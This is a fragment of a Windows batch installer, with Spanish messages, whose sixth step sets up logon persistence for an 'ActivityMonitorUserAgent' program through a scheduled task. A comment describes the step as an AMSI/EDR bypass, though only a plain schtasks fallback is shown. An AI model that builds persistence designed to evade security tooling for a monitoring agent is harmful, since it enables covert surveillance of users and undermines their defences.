...
REM 6. Register User Task via XML (AMSI/EDR bypass)
echo [6/6] Configurando tarea de usuario...
...
if !SCHTASK_ERR! equ 0 (
    ...
    REM Fallback: simple ONLOGON task
    schtasks /Create /SC ONLOGON /TN "ActivityMonitorUserAgent" /TR "\"%AGENT_BIN%\"" /F /IT >nul 2>&1
    if !errorLevel! equ 0 (
        echo     [!] Tarea creada (fallback) >> "%LOG_FILE%"
    ) else (
        echo [WARN] No se pudo crear la tarea programada >> "%LOG_FILE%"
    )
)
